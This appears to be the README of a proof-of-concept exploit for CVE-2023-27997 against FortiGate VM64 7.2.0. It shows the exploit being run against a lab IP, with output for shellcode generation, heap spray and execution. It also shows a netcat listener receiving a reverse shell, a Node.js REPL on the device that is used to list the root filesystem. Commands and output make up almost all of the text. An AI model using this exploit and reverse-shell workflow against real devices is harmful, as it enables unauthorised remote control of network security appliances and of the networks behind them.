# CVE-2023-27997

FortiGate VM64 7.2.0 is exploitable by this code. (note that the code was written in a very stupid way.)

## Proof of Concept

```
$ python3 exploit.py 192.168.106.142 10443 192.168.106.143 9999
[+] generating shellcode
[+] salt=b'25c2dcf2'
[+] processing hash
    [+] finding hash in cache
    [-] not in cache
    [+] computing
    [+] loading
[+] heap spray
[+] execute
```

```
$ nc -lvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [192.168.106.142] port 9999 [tcp/*] accepted (family 2, sport 2165)
Welcome to Node.js v12.20.1.
Type ".help" for more information.
> .help
.break   Sometimes you get stuck, this gets you out
.clear   Alias for .break
.exit    Exit the repl
.help    Print this help message
.load    Load JS from a file into the REPL session
.save    Save all evaluated commands in this REPL session to a file

Press ^C to abort current expression, ^D to exit the repl
> fs.readdir("/", (err, files) => {
  files.forEach(file => {
    console.log(file);
  });
});
... ..... ..... ... undefined
> .fgtsum
.fgtsum2
bin
boot
data
data2
dev
etc
fortidev
init
lib
lib64
local
migadmin
node-scripts
proc
root
sbin
sys
tmp
usr
var

> 
```
